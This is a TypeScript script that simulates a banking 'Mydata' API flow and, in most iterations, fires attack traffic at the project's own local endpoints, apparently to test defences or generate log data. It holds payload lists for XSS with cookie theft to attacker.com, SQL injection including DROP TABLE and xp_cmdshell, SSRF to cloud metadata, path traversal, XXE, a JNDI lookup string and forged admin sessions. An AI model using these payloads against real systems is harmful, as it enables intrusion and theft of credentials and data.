import { PrismaClient } from '@prisma/client';
import { faker } from '@faker-js/faker';
import dayjs from 'dayjs';

const prisma = new PrismaClient();
const otherBankAPI = process.env.OTHER_BANK_API || '';
const orgCode = process.env.NEXT_PUBLIC_ORG_CODE || '';
const otherOrgCode = process.env.OTHER_ORG_CODE || '';

// Type definitions
interface Consent {
	tx_id: string;
	consent_title: string;
	consent: string;
	consent_len: number;
}

interface BodyIA102 {
	sign_tx_id: string;
	user_ci: string;
	real_name: string;
	phone_num: string;
	request_title: string;
	device_code: string;
	device_browser: string;
	return_app_scheme_url: string;
	consent_type: string;
	consent_cnt: number;
	consent_list: Consent[];
	session_id?: string;
	user_cookie?: string;
}

interface BodyIA103 {
	cert_tx_id: string;
	sign_tx_id: string;
}

interface BodyIA002 {
	tx_id: string;
	org_code: string;
	grant_type: string;
	client_id: string;
	client_secret: string;
	ca_code: string;
	username: string;
	request_type: string;
	password_len: string;
	password: string;
	auth_type: string;
	consent_type: string;
	consent_len: string;
	consent: string;
	signed_person_info_req_len: string;
	signed_person_info_req: string;
	consent_nonce: string;
	ucpid_nonce: string;
	cert_tx_id: string;
	service_id: string;
	session_token?: string;
	auth_cookie?: string;
}

interface MaliciousHeaders {
	'Content-Type': string;
	Cookie: string;
	Authorization?: string;
	'x-api-tran-id': string;
	'X-Session-Token'?: string;
	'X-Forwarded-For'?: string;
	'X-Original-URL'?: string;
	Referer?: string;
	'X-Cache-Control'?: string;
	'If-None-Match'?: string;
	'X-Custom-Header'?: string;
	'X-Debug-Mode'?: string;
	'X-Override-URL'?: string;
	'X-Real-IP'?: string;
	'X-Remote-Addr'?: string;
	'X-Originating-IP'?: string;
	'X-Remote-IP'?: string;
	'X-Client-IP'?: string;
	'x-api-type'?: string;
}

// Utility functions
export const generateTIN = (prefix: string) => {
	const date = new Date();
	const timestamp = date
		.toISOString()
		.replace(/[-:.TZ]/g, '')
		.slice(0, 14);
	return prefix + timestamp;
};

export function timestamp(date: Date): string {
	return date
		.toISOString()
		.replace(/[-:.TZ]/g, '')
		.slice(0, 14);
}

// Attack payload generators
const generateXSSPayload = (): string =>
	faker.helpers.arrayElement([
		'<script>alert("XSS")</script>',
		'<img src=x onerror=alert(1)>',
		'<svg/onload=alert(document.domain)>',
		'"><script>alert(document.cookie)</script>',
		'"><img src=x onerror=fetch(`//attacker.com?c=${document.cookie}`)>',
		'<iframe src="javascript:alert(`xss`)">',
		'"><svg><animate onbegin=alert() attributeName=x dur=1s>',
		'<img src=x oneonerrorrror=alert(1)>',
		'<script>fetch(`https://attacker.com/${document.cookie}`)</script>',
		'"><input onfocus=alert(1) autofocus>',
	]);

const generateSQLiPayload = (): string =>
	faker.helpers.arrayElement([
		"' OR '1'='1",
		"' UNION SELECT password FROM users--",
		"'; DROP TABLE users--",
		"' OR 1=1 LIMIT 1; --",
		"admin'--",
		"' OR 1=1 /*",
		"'; EXEC xp_cmdshell('net user');--",
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
		"')) OR 1=1--",
		"')); DROP TABLE users; --",
	]);

const generateSSRFPayload = (): string =>
	faker.helpers.arrayElement([
		'http://internal-service.local',
		'http://169.254.169.254/latest/meta-data',
		'http://localhost/admin',
		'file:///etc/passwd',
		'http://10.0.0.1/internal-api',
		'gopher://localhost:3306/_SELECT%20*%20FROM%20users',
		'http://[::]:22',
		'dict://internal-service:11211/stat',
		'http://localhost:6379/FLUSHALL',
		'ftp://anonymous:anonymous@localhost:21',
	]);

const generateTraversalPayload = (): string =>
	faker.helpers.arrayElement([
		'../../etc/passwd',
		'.../..././etc/passwd',
		'%2e%2e%2fetc%2fpasswd',
		'..\\Windows\\System32\\config\\SAM',
		'/../../../../../../etc/shadow',
		'....//....//etc/passwd',
		'..//..//../..//etc/passwd',
		'..%252f..%252f..%252fetc/passwd',
		'..%c0%af..%c0%af..%c0%afetc/passwd',
		'/..././..././etc/passwd',
	]);

const generateXXEPayload = (): string => `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "${faker.helpers.arrayElement([
	'file:///etc/passwd',
	'http://internal-service.local',
	'php://filter/convert.base64-encode/resource=index.php',
	'file:///C:/Windows/System32/drivers/etc/hosts',
	'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin',
	'file:///proc/self/environ',
	'file:///dev/random',
	'https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Files/XXE-FTP-upload.xml',
	'jar:file:///etc/passwd!/../../etc/passwd',
	'netdoc:/etc/passwd',
])}" >]>
<foo>&xxe;</foo>`;

const generateCookiePayload = (): string =>
	faker.helpers.arrayElement([
		'javascript:alert(document.cookie)',
		`${btoa('<script>document.location="http://attacker.com/steal.php?c="+document.cookie</script>')}`,
		'PHPSESSID="+alert(1)+"',
		'', // Empty cookie test
		'session_id=NULL;',
		'session_id=undefined;',
		`JSESSIONID=${faker.string.alphanumeric(32)}`,
		'auth_token=admin_token',
		'rememberMe=deleteMe',
		`session=${btoa('{"admin":true,"role":"superuser"}')}`,
		`cookie=value\r\nSet-Cookie: malicious=true`,
		'cookie="><script>alert(1)</script>',
		`session=${'\n'.repeat(100)}`,
		`auth=${new Array(5000).join('A')}`, // Buffer overflow
	]);

const generateSessionPayload = (): string =>
	faker.helpers.arrayElement([
		'', // Empty session test
		'NULLED_SESSION',
		'EXPIRED_' + Date.now(),
		faker.helpers.arrayElement(['null', 'undefined', '[object Object]']),
		btoa('{"admin": true, "user_id": "1"}'),
		'/../../../tmp/sess_' + faker.string.alphanumeric(32),
		JSON.stringify({ role: 'admin', authenticated: true }),
		btoa('{"isAdmin":true,"csrf_token":"bypassed"}'),
		'eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
		`SESSION=${Buffer.from('{"role":"admin"}').toString('base64')}`,
	]);

const generateEmptyFieldPayload = (): string | null | undefined =>
	faker.helpers.arrayElement([
		'',
		' ',
		null,
		undefined,
		'{}',
		'[]',
		'\x00', // null byte
		'\n\r\t', // whitespace
		'undefined',
		'null',
		new Array(1000).join('A'), // Buffer overflow attempt
		'   ', // Multiple spaces
		String.fromCharCode(0x00), // Null byte
		'\u0000', // Unicode null
		Buffer.from('00', 'hex').toString(),
	]);

const generateRandomAttack = (): string =>
	faker.helpers.arrayElement([
		generateXSSPayload(),
		generateSQLiPayload(),
		generateSSRFPayload(),
		generateTraversalPayload(),
		generateXXEPayload(),
		generateCookiePayload(),
		generateSessionPayload(),
		generateEmptyFieldPayload(),
	]) as string;

// Header manipulation generator
const generateMaliciousHeaders = (): MaliciousHeaders => {
	const cookieAttacks = [
		// SQL injection in cookies
		`session_id=' OR '1'='1; auth_token=admin`,
		`session_id=1; UNION SELECT password FROM users--`,
		// XSS in cookies
		`user=<script>alert(1)</script>; auth=test`,
		`user=<img src=x onerror=fetch('/api/steal?cookie='+document.cookie)>`,
		// Empty or malformed cookies
		`session=;auth=`,
		`session=${'\n'.repeat(100)}`, // Header injection attempt
		// Cookie overflow attempt
		`session=${new Array(5000).join('A')}`,
		// Path traversal in cookie
		`file=../../../etc/passwd; auth=test`,
		// Multiple cookie injection
		`a=1; b=2; c=3; ${generateRandomAttack()}`,
		// JSON injection
		`session={"isAdmin":true,"role":"admin"}`,
		// Protocol injection
		`session=file:///etc/passwd`,
		// Template injection
		`session=${'{{'}}system.run('cat /etc/passwd')}}`,
	];

	const ipSpoofing = faker.helpers.arrayElement([
		'127.0.0.1',
		'localhost',
		'internal-server',
		'169.254.169.254',
		'0.0.0.0',
		'::1',
		'localhost:80',
		'[::]',
		'[::1]',
		'127.0.0.1:22',
	]);

	return {
		'Content-Type': faker.helpers.arrayElement([
			'application/x-www-form-urlencoded',
			'../../etc/passwd\x00.json',
			"text/html;script-src-elem 'unsafe-inline'",
			'../../../etc/passwd%00.json',
			'multipart/form-data; boundary=--',
			'application/json, text/javascript, */*; q=0.01',
		]),
		Cookie: faker.helpers.arrayElement(cookieAttacks),
		'X-Session-Token': generateSessionPayload(),
		'X-Forwarded-For': ipSpoofing,
		'X-Real-IP': ipSpoofing,
		'X-Remote-Addr': ipSpoofing,
		'X-Originating-IP': ipSpoofing,
		'X-Remote-IP': ipSpoofing,
		'X-Client-IP': ipSpoofing,
		'X-Original-URL': generateSSRFPayload(),
		Referer: generateSSRFPayload(),
		Authorization: `Bearer ${faker.helpers.arrayElement([
			generateRandomAttack(),
			btoa('admin:admin'),
			'null',
			'undefined',
			' ',
			generateEmptyFieldPayload(),
			'${jndi:ldap://attacker.com/exploit}',
			'"><script>alert(1)</script>',
		])}`,
		'X-Cache-Control': faker.helpers.arrayElement([
			'no-store, no-cache, must-revalidate',
			'max-age=0',
			'no-transform',
			'../../../etc/passwd',
		]),
		'If-None-Match': generateRandomAttack(),
		'X-Custom-Header': generateXXEPayload(),
		'X-Debug-Mode': 'true',
		'X-Override-URL': generateSSRFPayload(),
		'x-api-tran-id': generateXSSPayload(),
	};
};

export const getIA101 = async () => {
	try {
		const options = {
			method: 'POST',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded',
				'x-api-tran-id': generateTIN('IA101'),
			},
			body: new URLSearchParams({
				grant_type: 'client_credential',
				client_id: process.env.NEXT_PUBLIC_CLIENT_ID || '',
				client_secret: process.env.NEXT_PUBLIC_CLIENT_SECRET || '',
				scope: 'ca',
			}),
		};

		const response = await fetch('http://localhost:3000/api/oauth/2.0/token', options);

		if (!response.ok) {
			// Handle HTTP errors
			throw new Error(`HTTP error! Status: ${response.status}`);
		}

		const data = await response.json();
		return data;
	} catch (error) {
		console.error('Error:', error);
		throw error;
	}
};

export const getIA102 = async (accessToken: string, body: BodyIA102) => {
	const options = {
		method: 'POST',
		headers: {
			'Access-Control-Allow-Origin': '*',
			'Content-Type': 'application/json',
			'x-api-tran-id': generateTIN('IA102'),
			Authorization: `Bearer ${accessToken}`,
		},
		body: JSON.stringify(body),
	};

	const response = await fetch(`http://localhost:3000/api/ca/sign_request`, options);

	if (!response.ok) {
		// Handle HTTP errors
		throw new Error(`HTTP error on IA102! Status: ${response.status}`);
	}

	const res = await response.json();

	return res;
};

export const getIA103 = async (accessToken: string, body: BodyIA103) => {
	const options = {
		method: 'POST',
		headers: {
			'Access-Control-Allow-Origin': '*',
			'Content-Type': 'application/json',
			'x-api-tran-id': generateTIN('IA103'),
			Authorization: `Bearer ${accessToken}`,
		},
		body: JSON.stringify(body),
	};

	const response = await fetch(`http://localhost:3000/api/ca/sign_result`, options);

	if (!response.ok) {
		// Handle HTTP errors
		throw new Error(`HTTP error on IA103! Status: ${response.status}`);
	}

	const res = await response.json();

	return res;
};

export const getIA002 = async (body: BodyIA002) => {
	// Assumption: Mydata app is looking for api of the bank with orgCode to get the access token

	const options = {
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded',
			'x-api-tran-id': generateTIN('IA002'),
		},
		body: new URLSearchParams(body as any),
	};

	const response = await fetch(`${otherBankAPI}/api/oauth/2.0/token`, options);

	if (!response.ok) {
		// Handle HTTP errors
		throw new Error(`HTTP error on IA002! Status: ${response.status}`);
	}

	const res = await response.json();

	return res;
};

export async function getSupport001() {
	try {
		const options = {
			method: 'POST',
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded',
				'x-api-tran-id': generateTIN('SU001'),
			},
			body: new URLSearchParams({
				grant_type: 'client_credential',
				client_id: process.env.NEXT_PUBLIC_CLIENT_ID || '',
				client_secret: process.env.NEXT_PUBLIC_CLIENT_SECRET || '',
				scope: 'manage',
			}),
		};

		const response = await fetch('http://localhost:3000/api/v2/mgmts/oauth/2.0/token', options);

		if (!response.ok) {
			// Handle HTTP errors
			throw new Error(`HTTP error! Status: ${response.status}`);
		}

		const data = await response.json();
		return data;
	} catch (error) {
		console.error('Error:', error);
		throw error;
	}
}

export async function getSupport002() {
	const token = await getSupport001();

	const { access_token } = token;

	const options = {
		method: 'GET',
		headers: {
			'Access-Control-Allow-Origin': '*',
			'Content-Type': 'application/json',
			'x-api-tran-id': generateTIN('SU002'),
			Authorization: `Bearer ${access_token}`,
		},
	};

	const response = await fetch(`http://localhost:3000/api/v2/mgmts/orgs?search_timestamp=`, options);

	if (!response.ok) {
		// Handle HTTP errors
		throw new Error(`HTTP error! Status: ${response.status}`);
	}

	const res = await response.json();

	return res;
}

export const generateBodyIA102 = async (account: any) => {
	// Fetch accounts that belong to the organization

	const caCode = faker.helpers.arrayElement(['CA20250001']);
	const newTimestamp = timestamp(new Date());
	const serialNum = faker.helpers.arrayElement(['BASA20240204', 'BABB20230106']);

	const signTxId = `${orgCode}_${caCode}_${newTimestamp}_${serialNum}`;

	const firstName = account.firstName;
	const lastName = account.lastName;
	const b64UserCI = Buffer.from(account.pinCode).toString('base64');

	const fullName = `${firstName} ${lastName}`;
	const phoneNum = account.phoneNumber;

	// Generate request title based on bank request for consent
	const requestTitle = faker.helpers.arrayElement([
		'Request for Consent to Use Personal Information',
		'Request for Consent to Use Personal Information for Marketing',
		'Request for Consent to Use Personal Information for Research',
		'Request for Consent to Use Personal Information for Service Improvement',
		'Request for Consent to Use Personal Information for Service Development',
	]);

	const deviceCode = faker.helpers.arrayElement(['PC', 'MO', 'TB']);

	const relayAgencyCode = faker.helpers.arrayElement([
		'RA20250001',
		'RA20250002',
		'RA20250003',
		'RA20250004',
		'RA20250005',
	]);

	const consentTitles = [
		'Consent Request for Transmission',
		'Consent to Collection and Use of Personal Information',
		'Consent to Provide Personal Information',
	];

	const consentValues = ['consent-001', 'consent-002', 'consent-003', 'consent-004', 'consent-005'];

	// Randomly determine how many consents to generate (1 to 3)
	const numConsents = faker.number.int({ min: 1, max: 3 });

	// Generate consent_list dynamically
	const consent_list = Array.from({ length: numConsents }, (_, index) => {
		const consent = faker.helpers.arrayElement(consentValues);
		const shaConsent = Buffer.from(consent).toString('base64');
		const txId = `MD_${orgCode}_${otherOrgCode}_${relayAgencyCode}_${caCode}_${newTimestamp}_${'XXAB0049000' + index}`;

		return {
			tx_id: txId,
			consent_title: consentTitles[index], // Ensure unique title for each
			consent: shaConsent,
			consent_len: shaConsent.length,
		};
	});

	const return_app_scheme_url = `https://anya-bank.com/return`;

	const body: BodyIA102 = {
		sign_tx_id: signTxId,
		user_ci: b64UserCI,
		real_name: fullName,
		phone_num: phoneNum,
		request_title: requestTitle,
		device_code: deviceCode,
		device_browser: 'WB',
		return_app_scheme_url: return_app_scheme_url,
		consent_type: '1',
		consent_cnt: consent_list.length,
		consent_list: consent_list,
	};

	return body;
};

export const generateBodyIA002 = async (certTxId: string, consent_list: any, signed_consent_list: any) => {
	// Assumed that signed_consent is already decoded from base64

	const txId = signed_consent_list[0].tx_id;

	const orgCode = txId.split('_')[0];
	const ipCode = txId.split('_')[1];
	const raCode = txId.split('_')[2];
	const caCode = txId.split('_')[3];

	const organization = await prisma.organization.findFirst({
		where: {
			orgCode: ipCode,
		},
	});

	if (!organization) {
		throw new Error('Organization not found');
	}

	const oAuthClient = await prisma.oAuthClient.findFirst({
		where: {
			organizationId: organization?.id,
		},
	});

	if (!oAuthClient) {
		throw new Error('OAuth Client not found');
	}

	const certificate = await prisma.certificate.findFirst({
		where: {
			certTxId: certTxId,
		},
	});

	if (!certificate) {
		throw new Error('Certificate not found');
	}

	const account = await prisma.account.findFirst({
		where: {
			phoneNumber: certificate.phoneNumber,
		},
	});

	if (!account) {
		throw new Error('Account not found');
	}
	const registrationDate = dayjs().format('DDMMYYYY');
	const serialNum = '0001';

	const generateNonce = () => {
		const letter = faker.string.alpha({ casing: 'upper', length: 1 }); // Random uppercase letter (A-Z)
		const year = dayjs().format('YYYY'); // Current year (e.g., 2025)
		const randomNumber = faker.number.int({ min: 100000000000000, max: 999999999999999 }); // 15-digit number

		return `${letter}${year}${randomNumber}`;
	};

	const b64PersonInfo = Buffer.from(account.firstName + account.lastName).toString('base64');
	const b64UserCI = Buffer.from(account.pinCode).toString('base64');
	const b64Password = Buffer.from('PASSWORD').toString('base64');

	const bodyIA002: BodyIA002 = {
		tx_id: txId,
		org_code: orgCode,
		grant_type: 'password',
		client_id: oAuthClient.clientId,
		client_secret: oAuthClient.clientSecret,
		ca_code: caCode,
		username: b64UserCI,
		request_type: '1',
		password_len: b64Password.length.toString(),
		password: b64Password,
		auth_type: '1',
		consent_type: '1',
		consent_len: consent_list[0].consent_len.toString(),
		consent: consent_list[0].consent,
		signed_person_info_req_len: b64PersonInfo.length.toString(),
		signed_person_info_req: b64PersonInfo,
		consent_nonce: generateNonce(),
		ucpid_nonce: generateNonce(),
		cert_tx_id: certTxId,
		service_id: `${ipCode}${registrationDate}${serialNum}`, //institution code (10 digits) + registration date (8 digits) + serial number (4 digits)
	};

	return bodyIA002;
};

const getAccountsBasic = async (orgCode: string, accountNum: string, accessToken: string) => {
	// Assumption: Mydata app is looking for api of the bank with orgCode to get the access token

	const options = {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
			'x-api-tran-id': generateTIN('AB001'),
			'x-api-type': faker.helpers.arrayElement(['regular', 'irregular']),
			Authorization: `Bearer ${accessToken}`,
		},
		body: JSON.stringify({
			org_code: otherOrgCode,
			account_num: accountNum,
			next: '0',
			search_timestamp: timestamp(new Date()),
		}),
	};

	const response = await fetch(`${otherBankAPI}/api/v2/bank/accounts/deposit/basic`, options);

	if (!response.ok) {
		// Handle HTTP errors
		throw new Error(`HTTP error! Status: ${response.status}`);
	}

	const data = await response.json();
	return data;
};

const getAccountsDetail = async (orgCode: string, accountNum: string, accessToken: string) => {
	// Assumption: Mydata app is looking for api of the bank with orgCode to get the access token

	const options = {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
			'x-api-tran-id': generateTIN('AD001'),
			'x-api-type': faker.helpers.arrayElement(['regular', 'irregular']),
			Authorization: `Bearer ${accessToken}`,
		},
		body: JSON.stringify({
			org_code: otherOrgCode,
			account_num: accountNum,
			next: '0',
			search_timestamp: timestamp(new Date()),
		}),
	};

	const response = await fetch(`${otherBankAPI}/api/v2/bank/accounts/deposit/detail`, options);

	if (!response.ok) {
		// Handle HTTP errors
		throw new Error(`HTTP error! Status: ${response.status}`);
	}

	const data = await response.json();
	return data;
};

async function main() {
	// Generate a simulation of a normal user flow and interactions between bank app and Mydata app
	// Interaction 1: User wants to to sign up
	// Assumptions:
	// Accounts in the Anya Bank and Bond Bank have been created
	// The user has already logged in to the bank app and is trying to connect their accounts through the Mydata app
	// User has to sign up to the Mydata Service and accept the terms and conditions
	//
	// Call for a token to access the Mydata API, /api/v2/mgmts/oauth/2.0/token
	// Call for a list of organizations, /api/v2/mgmts/orgs?search_timestamp=

	try {
		const response = await getSupport002();

		if (!response) {
			throw new Error('Error fetching organization list');
		}
	} catch (error) {
		console.error('Error on support002:', error);
		throw error;
	}

	// Interaction 2: User wants to connect their accounts to the selected banks
	// Assumptions: User has selected the bank except the one they are currently logged in to

	// Consent will be required from the user to connect their accounts
	// Consent List: "Consent Request for Transmission", "Consent to Collection and Use of Personal Information", "Consent to Provide Personal Information"

	try {
		const token = await getIA101();
		const { access_token } = token;

		if (!access_token) {
			throw new Error('Error fetching access token in IA101');
		}

		// add delay to simulate user interaction
		await new Promise((resolve) => setTimeout(resolve, 500));

		// Get all the accounts that belong to the organization
		const accounts = await prisma.account.findMany({
			where: {
				orgCode: orgCode,
			},
		});

		if (!accounts) {
			throw new Error('Error fetching accounts');
		}

		const account = faker.helpers.arrayElement(accounts);
		const accountNum = account.accountNum;

		const bodyIA102 = await generateBodyIA102(account);

		const responseIA102 = await getIA102(access_token, bodyIA102);
		if (!responseIA102) {
			throw new Error('Error sign request in IA102');
		}

		// add delay to simulate user interaction
		await new Promise((resolve) => setTimeout(resolve, 500));

		const bodyIA103: BodyIA103 = {
			sign_tx_id: bodyIA102.sign_tx_id,
			cert_tx_id: responseIA102.cert_tx_id,
		};

		const responseIA103 = await getIA103(access_token, bodyIA103);
		if (!responseIA103) {
			throw new Error('Error sign result in IA103');
		}

		// add delay to simulate user interaction
		await new Promise((resolve) => setTimeout(resolve, 500));

		// After the integrated certification has been completed from Certification Authority, the response will
		// be sent to the bank app (Information Provider) to complete the process
		// this will provide access_token to allow access to the user's data
		// Interaction 3: User wants to access their data from other banks

		const certTxId = responseIA102.certTxId;

		const signedConsentList = responseIA103.signed_consent_list;
		const consentList = bodyIA102.consent_list;

		const bodyIA002 = await generateBodyIA002(certTxId, consentList, signedConsentList);
		const responseIA002 = await getIA002(bodyIA002);

		if (!responseIA002) {
			throw new Error('Error request for access token in IA002');
		}

		// add delay to simulate user interaction
		await new Promise((resolve) => setTimeout(resolve, 500));

		// Interaction 4: User wants to view their accounts from other banks
		// Assumptions: User has already connected their accounts to the Mydata app
		// User can either view basic account information or detailed account information or both

		const isGetBasic = faker.helpers.arrayElement([true, false]);
		const isGetDetail = faker.helpers.arrayElement([true, false]);

		if (isGetBasic) {
			const accountsBasic = await getAccountsBasic(orgCode, accountNum, responseIA002.access_token);
			if (!accountsBasic) {
				throw new Error('Error fetching basic account information');
			}

			// add delay to simulate user interaction
			await new Promise((resolve) => setTimeout(resolve, 500));
		}

		if (isGetDetail) {
			// Call for detailed account information
			const accountsDetail = await getAccountsDetail(orgCode, accountNum, responseIA002.access_token);
			if (!accountsDetail) {
				throw new Error('Error fetching detailed account information');
			}

			// add delay to simulate user interaction
			await new Promise((resolve) => setTimeout(resolve, 500));
		}
	} catch (error) {
		console.error('Error within interaction', error);
		throw error;
	}
}
// Modified attack versions of API functions
const attackGetIA101 = async (): Promise<Response> => {
	const options: any = {
		method: 'POST',
		headers: generateMaliciousHeaders(),
		body: new URLSearchParams({
			grant_type: faker.datatype.boolean() ? (generateEmptyFieldPayload() as string) : generateSQLiPayload(),
			client_id: generateRandomAttack(),
			client_secret: generateRandomAttack(),
			scope: generateTraversalPayload(),
		}).toString(),
	};

	return fetch('http://localhost:3000/api/oauth/2.0/token', options);
};

const attackGetIA102 = async (accessToken: string, body: BodyIA102): Promise<Response> => {
	const maliciousHeaders = generateMaliciousHeaders();
	maliciousHeaders.Authorization = `Bearer ${generateRandomAttack()}`;

	const options: any = {
		method: 'POST',
		headers: maliciousHeaders,
		body: JSON.stringify({
			...body,
			device_code: faker.datatype.boolean() ? generateEmptyFieldPayload() : generateXXEPayload(),
			consent_list: body.consent_list.map((consent: Consent) => ({
				...consent,
				tx_id: generateSSRFPayload(),
			})),
		}),
	};

	return fetch(`http://localhost:3000/api/ca/sign_request`, options);
};

const attackGetIA103 = async (accessToken: string, body: BodyIA103): Promise<Response> => {
	const maliciousHeaders = generateMaliciousHeaders();
	maliciousHeaders.Authorization = `Bearer ${accessToken}`;

	const options: any = {
		method: 'POST',
		headers: maliciousHeaders,
		body: JSON.stringify({
			...body,
			cert_tx_id: faker.datatype.boolean() ? generateEmptyFieldPayload() : generateSQLiPayload(),
		}),
	};

	return fetch(`http://localhost:3000/api/ca/sign_result`, options);
};

const attackGetIA002 = async (body: BodyIA002): Promise<Response> => {
	const options: any = {
		method: 'POST',
		headers: generateMaliciousHeaders(),
		body: new URLSearchParams({
			...(body as unknown as Record<string, string>),
			org_code: generateSSRFPayload(),
			client_id: generateXSSPayload(),
			password: generateTraversalPayload(),
		}).toString(),
	};

	return fetch(`${generateSSRFPayload()}/api/oauth/2.0/token`, options);
};

// Modified versions of support functions with attacks
const attackGetSupport001 = async (): Promise<Response> => {
	const options: any = {
		method: 'POST',
		headers: generateMaliciousHeaders(),
		body: new URLSearchParams({
			grant_type: faker.datatype.boolean() ? (generateEmptyFieldPayload() as string) : 'client_credential',
			client_id: generateXSSPayload(),
			client_secret: generateSQLiPayload(),
			scope: generateTraversalPayload(),
		}).toString(),
	};

	return fetch('http://localhost:3000/api/v2/mgmts/oauth/2.0/token', options);
};

const attackGetSupport002 = async (token: string): Promise<Response> => {
	const maliciousHeaders = generateMaliciousHeaders();
	maliciousHeaders.Authorization = `Bearer ${token}`;

	const options: any = {
		method: 'GET',
		headers: maliciousHeaders,
	};

	const maliciousTimestamp = faker.helpers.arrayElement([
		generateSQLiPayload(),
		generateTraversalPayload(),
		generateEmptyFieldPayload(),
		new Date(0).toISOString(),
		'NULL',
		'../../etc/passwd',
	]);

	return fetch(`http://localhost:3000/api/v2/mgmts/orgs?search_timestamp=${maliciousTimestamp}`, options);
};

// Modified attack version of account functions
const attackGetAccountsBasic = async (orgCode: string, accountNum: string, accessToken: string): Promise<Response> => {
	const maliciousHeaders = generateMaliciousHeaders();
	maliciousHeaders.Authorization = `Bearer ${accessToken}`;
	maliciousHeaders['x-api-type'] = faker.helpers.arrayElement([
		'regular',
		'irregular',
		'admin',
		'superuser',
		'../../etc/passwd',
	]);

	const options: any = {
		method: 'POST',
		headers: maliciousHeaders,
		body: JSON.stringify({
			org_code: faker.datatype.boolean() ? generateEmptyFieldPayload() : otherOrgCode,
			account_num: faker.datatype.boolean() ? generateSQLiPayload() : accountNum,
			next: faker.helpers.arrayElement(['0', '-1', 'null', 'undefined', generateXSSPayload()]),
			search_timestamp: faker.datatype.boolean() ? generateTraversalPayload() : timestamp(new Date()),
		}),
	};

	return fetch(`${generateSSRFPayload()}/api/v2/bank/accounts/deposit/basic`, options);
};

const attackGetAccountsDetail = async (orgCode: string, accountNum: string, accessToken: string): Promise<Response> => {
	const maliciousHeaders = generateMaliciousHeaders();
	maliciousHeaders.Authorization = `Bearer ${accessToken}`;
	maliciousHeaders['x-api-type'] = faker.helpers.arrayElement(['regular', 'irregular', 'admin', generateXSSPayload()]);

	const options: any = {
		method: 'POST',
		headers: maliciousHeaders,
		body: JSON.stringify({
			org_code: faker.datatype.boolean() ? generateXXEPayload() : otherOrgCode,
			account_num: faker.datatype.boolean() ? generateSQLiPayload() : accountNum,
			next: generateRandomAttack(),
			search_timestamp: faker.datatype.boolean() ? generateTraversalPayload() : timestamp(new Date()),
		}),
	};

	return fetch(`${generateSSRFPayload()}/api/v2/bank/accounts/deposit/detail`, options);
};

const generateAttackBodyIA002 = async (
	certTxId: string,
	consent_list: any,
	signed_consent_list: any
): Promise<BodyIA002> => {
	const body = await generateBodyIA002(certTxId, consent_list, signed_consent_list);

	return {
		...body,
		username: faker.datatype.boolean() ? (generateEmptyFieldPayload() as string) : generateRandomAttack(),
		password: generateRandomAttack(),
		consent: generateRandomAttack(),
		signed_person_info_req: generateRandomAttack(),
		service_id: generateTraversalPayload(),
		client_secret: generateSQLiPayload(),
		session_token: generateSessionPayload(),
		auth_cookie: generateCookiePayload(),
	};
};
// Enhanced attack simulation function
export async function attackSimulate(): Promise<void> {
	try {
		// 1. Attack support endpoints
		const support001Response = await attackGetSupport001();
		if (support001Response.ok) {
			const token = await support001Response.json();
			await attackGetSupport002(token.access_token);
		}

		// 2. Simulate attack on token endpoint with enhanced header manipulation
		await attackGetIA101();

		// 3. Attack sign request with malicious payloads including enhanced session attacks
		const accounts = await prisma.account.findMany();
		const account = faker.helpers.arrayElement(accounts);
		const attackBodyIA102 = await generateBodyIA102(account);

		// Add enhanced cookie/header tampering attempts
		const headerAttacks = Array(5)
			.fill(null)
			.map(() => {
				return attackGetIA102('invalid_token', {
					...attackBodyIA102,
					session_id: generateSessionPayload(),
					user_cookie: generateCookiePayload(),
				});
			});

		await Promise.all(headerAttacks);

		// 4. Attack sign result endpoint with empty fields and enhanced headers
		const maliciousIA103Body: BodyIA103 = {
			cert_tx_id: faker.datatype.boolean() ? (generateEmptyFieldPayload() as string) : generateSQLiPayload(),
			sign_tx_id: generateXSSPayload(),
		};

		// Add enhanced session/header manipulation attempts
		const sessionAttacks = Array(5)
			.fill(null)
			.map(() => {
				return attackGetIA103('invalid_token', maliciousIA103Body);
			});

		await Promise.all(sessionAttacks);

		// 5. Attack OAuth token endpoint with enhanced cookie/session/header manipulation
		const attackBodyIA002 = await generateAttackBodyIA002(
			generateRandomAttack(),
			[{ consent: generateXXEPayload() }],
			[{ tx_id: generateSSRFPayload() }]
		);

		// Multiple enhanced attack variants
		for (let i = 0; i < 5; i++) {
			await attackGetIA002({
				...attackBodyIA002,
				session_token: generateSessionPayload(),
				auth_cookie: generateCookiePayload(),
			});
		}

		// 6. Attack account endpoints with enhanced attacks
		if (accounts.length > 0) {
			const accountNum = accounts[0].accountNum;

			// Basic account info attacks
			const basicAccountAttacks = Array(3)
				.fill(null)
				.map(() => attackGetAccountsBasic(orgCode, accountNum, 'invalid_token'));
			await Promise.all(basicAccountAttacks);

			// Detailed account info attacks
			const detailedAccountAttacks = Array(3)
				.fill(null)
				.map(() => attackGetAccountsDetail(orgCode, accountNum, 'invalid_token'));
			await Promise.all(detailedAccountAttacks);
		}
	} catch (error) {
		console.error('Attack simulation error:', error);
	}
}

// Modified runIterations with enhanced attack patterns
async function runIterations(): Promise<void> {
	const iterations = 500;
	const delay = 1000;

	for (let i = 0; i < iterations; i++) {
		console.log(`Iteration ${i + 1}`);

		// Randomly choose between normal and attack simulation
		// Increased probability of attacks for more thorough testing
		if (faker.number.int({ min: 1, max: 10 }) <= 7) {
			await attackSimulate();
		} else {
			await main();
		}

		await new Promise((resolve) => setTimeout(resolve, delay));
	}

	console.log('All simulations completed');
}

// Run mixed simulations
runIterations()
	.catch(console.error)
	.finally(() => prisma.$disconnect());
